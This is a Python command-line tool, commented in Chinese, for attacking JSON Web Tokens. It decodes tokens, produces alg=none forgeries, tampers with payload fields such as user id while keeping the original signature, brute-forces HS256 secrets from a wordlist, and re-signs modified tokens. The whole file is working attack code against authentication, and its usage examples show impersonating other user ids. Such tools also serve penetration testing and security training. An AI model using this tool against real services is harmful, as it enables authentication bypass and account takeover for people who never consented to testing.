#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""jwt_tool.py — JWT 解码 / 伪造 / 密钥爆破 / 算法混淆测试

用法:
  # 1) 解码（不验签）
  python jwt_tool.py decode <jwt>

  # 2) alg=none 测试
  python jwt_tool.py none <jwt>

  # 3) 改 payload（如把 id 改成别的）并保留原签名（测是否验签）
  python jwt_tool.py tamper <jwt> --set id=2

  # 4) 用字典爆破 HS256 密钥
  python jwt_tool.py brute <jwt> --wordlist keys.txt

  # 5) 已知密钥则直接签
  python jwt_tool.py sign <jwt> --secret mysecret --set id=1
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys


def b64u_dec(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64u_enc(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def parts(tok: str):
    p = tok.strip().split(".")
    if len(p) < 2:
        sys.exit("不是 JWT")
    hdr = json.loads(b64u_dec(p[0]))
    pay = json.loads(b64u_dec(p[1]))
    sig = p[2] if len(p) > 2 else ""
    return p, hdr, pay, sig


def sign_hs(header: dict, payload: dict, secret: bytes) -> str:
    h = b64u_enc(json.dumps(header, separators=(",", ":")).encode())
    p = b64u_enc(json.dumps(payload, separators=(",", ":")).encode())
    s = b64u_enc(hmac.new(secret, (h + "." + p).encode(), hashlib.sha256).digest())
    return "%s.%s.%s" % (h, p, s)


def cmd_decode(a):
    p, hdr, pay, sig = parts(a.token)
    print("header :", json.dumps(hdr, ensure_ascii=False))
    print("payload:", json.dumps(pay, ensure_ascii=False, indent=2))
    print("sig    :", sig[:32] + ("..." if len(sig) > 32 else ""))
    print("len    : header=%d payload=%d sig=%d" % (len(p[0]), len(p[1]), len(sig)))


def cmd_none(a):
    p, hdr, pay, sig = parts(a.token)
    for alg in ("none", "None", "NONE"):
        h2 = dict(hdr); h2["alg"] = alg
        h = b64u_enc(json.dumps(h2, separators=(",", ":")).encode())
        pp = b64u_enc(json.dumps(pay, separators=(",", ":")).encode())
        print("%-5s : %s.%s." % (alg, h, pp))
    print("\n(空签名/去点变体自己试：<h>.<p>. 与 <h>.<p>)")


def cmd_tamper(a):
    p, hdr, pay, sig = parts(a.token)
    for kv in (a.set or "").split(","):
        if "=" in kv:
            k, v = kv.split("=", 1)
            try:
                pay[k] = json.loads(v)
            except Exception:
                pay[k] = v
    h = b64u_enc(json.dumps(hdr, separators=(",", ":")).encode())
    pp = b64u_enc(json.dumps(pay, separators=(",", ":")).encode())
    print("保留原签名 : %s.%s.%s" % (h, pp, sig))
    print("新 payload :", json.dumps(pay, ensure_ascii=False))


def cmd_brute(a):
    p, hdr, pay, sig = parts(a.token)
    msg = (p[0] + "." + p[1]).encode()
    try:
        words = [l.strip() for l in open(a.wordlist, encoding="utf-8", errors="ignore") if l.strip()]
    except Exception as e:
        sys.exit("读不到字典: %s" % e)
    print("[+] 字典 %d 条，alg=%s" % (len(words), hdr.get("alg")))
    for w in words:
        s = b64u_enc(hmac.new(w.encode(), msg, hashlib.sha256).digest())
        if s == sig:
            print("\n*** HIT secret = %r" % w)
            return
    print("[-] 未命中")


def cmd_sign(a):
    p, hdr, pay, sig = parts(a.token)
    for kv in (a.set or "").split(","):
        if "=" in kv:
            k, v = kv.split("=", 1)
            try:
                pay[k] = json.loads(v)
            except Exception:
                pay[k] = v
    print(sign_hs(hdr, pay, a.secret.encode()))


def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)
    for n in ("decode", "none", "tamper", "brute", "sign"):
        p = sub.add_parser(n)
        p.add_argument("token")
        if n in ("tamper", "sign"):
            p.add_argument("--set", default="", help='k=v,k2=v2（值会尝试 JSON 解析）')
        if n == "brute":
            p.add_argument("--wordlist", required=True)
        if n == "sign":
            p.add_argument("--secret", required=True)
    a = ap.parse_args()
    {
        "decode": cmd_decode,
        "none": cmd_none,
        "tamper": cmd_tamper,
        "brute": cmd_brute,
        "sign": cmd_sign,
    }[a.cmd](a)


if __name__ == "__main__":
    main()
